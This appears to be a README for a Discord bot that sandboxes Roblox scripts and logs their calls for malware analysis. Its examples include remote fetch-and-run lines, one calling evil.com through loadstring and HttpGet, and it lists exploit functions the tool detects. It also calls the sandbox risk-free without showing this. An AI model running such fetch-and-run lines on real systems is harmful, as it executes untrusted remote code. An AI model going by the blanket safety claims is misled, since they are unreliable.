# 🔒 Ultimate Roblox Environment Logger

A **COMPREHENSIVE** Discord bot that provides complete execution logging of Roblox scripts with **ALL VM and Sandbox techniques combined**. Designed for production deployment with **ZERO RISK** - completely isolated, no file system access, no network access, no system access.

## ✨ **NEW: Ultimate Logger** 
All VM interception techniques, sandbox methods, and exploit detection strategies have been **unified into one powerful logger** (`env_logger_ultimate.lua`) for maximum coverage and compatibility.

## 🌟 Key Features

### Comprehensive Logging
- ✅ **100% Operation Coverage**: Every function call, property access, assignment
- ✅ **Complete Execution Trace**: Sequential code reconstruction  
- ✅ **Smart Variable Tracking**: v1, v2, v3... naming with full relationships
- ✅ **Exploit Function Detection**: Tracks loadstring, HTTP, file operations, etc.

### Maximum Security
- 🔒 **ZERO File System Access**: No reading/writing files
- 🔒 **ZERO Network Access**: No HTTP requests, all blocked
- �� **ZERO System Access**: No command execution
- 🔒 **Complete Isolation**: Sandboxed execution
- 🔒 **Output Sanitization**: No path/token leakage

### Production Ready
- 🚀 **Render.com Optimized**: Safe for cloud deployment
- 🚀 **Discord Bot Integration**: Easy !log command
- 🚀 **Docker Support**: One-click deployment
- 🚀 **No Dependencies**: Self-contained sandbox

## 📊 What It Does

### Input: Any Roblox Script
```lua
local code = game:HttpGet("https://pastebin.com/raw/xyz")
loadstring(code)()
writefile("config.txt", "data")
setclipboard(game.Players.LocalPlayer.Name)
```

### Output: Complete Security Analysis
```
-- HTTP GET REQUEST DETECTED
-- URL: https://pastebin.com/raw/xyz
-- [SECURITY] HTTP request NOT executed

-- loadstring() called with code
-- CODE PREVIEW: print("loaded")
-- [SECURITY] Loadstring NOT executed

writefile('config.txt', [content])
-- [SECURITY] File write NOT executed

setclipboard([text])
-- [SECURITY] Clipboard NOT modified

-- Total operations: 15
-- Security: MAXIMUM (no file/network access)
```

## 🎯 Use Cases

### ✅ Malware Analysis
Safely analyze malicious Roblox scripts:
- See all HTTP requests (blocked but logged)
- Capture loadstring code (logged but not executed)
- Track file operations (logged but not performed)
- Monitor clipboard access (logged but not executed)

### ✅ Deobfuscation
Understand what obfuscated scripts do:
- Complete execution trace
- All operations logged
- Clean code reconstruction
- No risk of execution

### ✅ Security Research
Study exploit techniques:
- Track hookfunction calls
- Monitor metatable manipulation
- See drawing library usage (ESP/aimbot)
- Analyze auto-farm patterns

### ✅ Discord Bot Integration
```
!log ```lua
loadstring(game:HttpGet("https://evil.com/script"))()
```
```

Bot responds with complete security analysis!

## 🔐 Security Architecture

### Layer 1: Environment Isolation
- Custom sandbox environment
- NO access to fs, net, process modules
- Only safe Roblox API mocks

### Layer 2: Function Interception
- All exploit functions intercepted
- Logged for analysis
- **NEVER executed**

### Layer 3: Output Sanitization
- File paths stripped (C:/Users/... removed)
- Tokens redacted (token=xyz → token=REDACTED)
- Error messages cleaned

### Layer 4: Read-Only Libraries
- math, table, string are locked
- Cannot modify standard libraries
- Metatable protection

### Layer 5: Execution Control
- Only provided script runs
- No loadstring execution  
- No external file loading
- No network access

## 📋 Tracked Operations

### Roblox API (100+ functions)
- Instance.new(), properties, methods
- game:GetService(), WaitForChild()
- Vector3, Color3, UDim2, Enum
- Events: Connect(), Changed, etc.
- TweenService, Lighting, etc.

### Exploit Functions (50+ functions)
- **Code Loading**: loadstring, require
- **HTTP**: game:HttpGet, syn.request
- **Files**: writefile, readfile, makefolder
- **Clipboard**: setclipboard
- **Hooks**: hookfunction, hookmetamethod
- **Drawing**: Drawing.new (ESP)
- **Events**: firesignal, fireclickdetector
- **System**: identifyexecutor, getgenv
- **And many more...**

## 🚀 Deployment

### Render.com (Recommended)

1. **Push to GitHub**
2. **Create Web Service** on Render
3. **Set Environment Variable**: `DISCORD_TOKEN`
4. **Deploy!**

See [DEPLOY.md](DEPLOY.md) for detailed instructions.

### Security Guarantees for Render.com
- ✅ Won't write files (no disk usage)
- ✅ Won't make network requests (no external calls)
- ✅ Won't spawn processes (no resource exhaustion)
- ✅ Won't access system (no compromise)
- ✅ Output is sanitized (no info leakage)

## 📁 Project structure

```
RobloxEnvironmentLogger/
├── src/
│   ├── bot.py                      # Discord bot (!log command)
│   ├── env_logger_ultimate.lua     # Ultimate environment logger (ALL techniques combined)
│   ├── sandbox.lua                 # Legacy sandbox (kept for reference)
│   └── vm_*.lua                    # Individual VM techniques (kept for reference)
├── Dockerfile                      # Render deployment
├── requirements.txt                # Python deps
├── README.md                       # This file
└── lune.exe                        # Lune runtime
```

## 🛡️ Security Features

### What's Blocked
- ❌ File system operations (read/write/delete)
- ❌ Network requests (HTTP/WebSocket)
- ❌ System commands (os.execute)
- ❌ Clipboard access (read/write)
- ❌ Process spawning (task.spawn with real execution)
- ❌ Dynamic code execution (loadstring)

### What's Logged
- ✅ All function calls with arguments
- ✅ All property accesses
- ✅ All property assignments
- ✅ All HTTP request attempts (URLs, headers, body)
- ✅ All file operation attempts (filenames, content)
- ✅ All loadstring code (complete source)
- ✅ All clipboard operations (text content)

### Output Safety
- ✅ No system paths exposed
- ✅ No tokens leaked
- ✅ No sensitive data in errors
- ✅ Safe for public display

## 📖 Documentation

- [SECURITY.md](SECURITY.md) - Complete security documentation
- [EXPLOIT_LOGGING.md](EXPLOIT_LOGGING.md) - Exploit function reference
- [LOGGING_FEATURES.md](LOGGING_FEATURES.md) - Logging capabilities
- [DEPLOY.md](DEPLOY.md) - Deployment guide

## ⚡ Quick Start

### Local Testing
```bash
# Test the ultimate logger (all techniques combined)
.\lune.exe run src/env_logger_ultimate.lua example_script.lua

# Or test legacy sandbox
.\lune.exe run src/sandbox.lua example_script.lua

# Run the bot locally
$env:DISCORD_TOKEN='your_token_here'
python src/bot.py
```

### Discord Usage
```
!log ```lua
local part = Instance.new("Part")
part.Parent = workspace
print("Done!")
```
```

## 🏆 Why This is Secure

1. **No File Access**: Can't read/write any files on the server
2. **No Network**: Can't make HTTP requests or connect externally
3. **No System Calls**: Can't execute commands or spawn processes
4. **Output Sanitized**: Can't leak server information
5. **Complete Isolation**: Runs in locked-down environment

**You can safely run ANY malicious script for analysis!**

## 📜 License

MIT License - See LICENSE file

## 🤝 Contributing

This is a security-focused project. Please report any security concerns privately.

## ⚠️ Disclaimer

This tool is for educational and security research purposes. Always analyze scripts responsibly and ethically.

---

**Built with maximum security for production deployment. Safe to use with untrusted code!** 🔒
